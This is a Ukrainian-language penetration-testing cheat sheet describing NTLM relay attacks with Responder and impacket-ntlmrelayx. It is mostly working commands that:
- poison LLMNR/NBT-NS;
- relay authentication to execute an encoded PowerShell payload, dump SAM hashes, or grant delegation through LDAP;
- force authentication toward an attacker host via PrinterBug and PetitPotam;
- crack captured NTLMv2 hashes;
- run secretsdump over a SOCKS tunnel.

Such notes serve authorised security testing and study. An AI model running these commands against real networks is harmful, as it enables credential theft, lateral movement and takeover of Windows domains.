# NTLM Relay (Responder + ntlmrelayx)

## Коли застосовується
- Мережа з LLMNR / NBT-NS (типово у старих корпоративних середовищах)
- SMB Signing = False на цільових хостах (перевір нижче)
- У тебе є позиція в тій же підмережі або pivoting до неї

## Крок 0 — перевірити, де SMB Signing вимкнено
```bash
nxc smb <subnet>/24 --gen-relay-list targets.txt
# targets.txt = хости з signing:False — саме на них relay
```

## Крок 1 — вимкнути SMB/HTTP у Responder (щоб не відповідав сам, а передавав далі)
```bash
# /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off
sudo responder -I <interface> -dPv
```

## Крок 2 — запустити ntlmrelayx
```bash
# relay → exec команди (якщо local admin на цілі)
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <b64-payload>"

# relay → дамп SAM (найпростіший варіант)
impacket-ntlmrelayx -tf targets.txt -smb2support

# relay → LDAP → додати себе до Domain Admins (якщо relay на DC)
impacket-ntlmrelayx -tf targets.txt -smb2support -wh <attacker-ip> --delegate-access
```

## Крок 3 — спровокувати автентифікацію
Жертва сама прийде після LLMNR/NBT-NS отруєння. Або вручну:
```bash
# Примусово через принтер (PrinterBug / SpoolSample)
impacket-dcomexec -object MMC20 '<domain>/<u>:<p>'@<target> "net use \\<attacker>\share"
# або через PetitPotam (якщо не пропатчено):
python3 PetitPotam.py -u <u> -p <p> <attacker-ip> <target-ip>
```

## Relay → отримати NTLMv2 хеш (для крекінгу)
```bash
# Просто запусти Responder без вимкнення SMB — тоді він захоплює, не relay
sudo responder -I <interface> -dPv
# Крекінг NTLMv2 (hashcat mode 5600):
hashcat -m 5600 captured.txt rockyou.txt
```

## Relay → сесія через SOCKS
```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
# у другому терміналі:
# ntlmrelayx відкриє SOCKS на 127.0.0.1:1080
# /etc/proxychains4.conf: socks4 127.0.0.1 1080
proxychains impacket-secretsdump '<domain>/<u>:@<IP>'
```

## Підводні камені
- Responder і ntlmrelayx повинні слухати на **різних** портах — тому SMB/HTTP у Responder вимкнено
- Relay на DC через SMB рідко дає local admin; relay → LDAP/LDAPS ефективніше для AD
- LDAPS relay вимагає `-wh` (WPAD) або явного виклику; перевір `--remove-mic` якщо MIC блокує

**Зв'язки:** [[Password-Attacks]] · [[Credential-Dumping]] · [[AD-Enumeration]] · [[Lateral-Movement]]
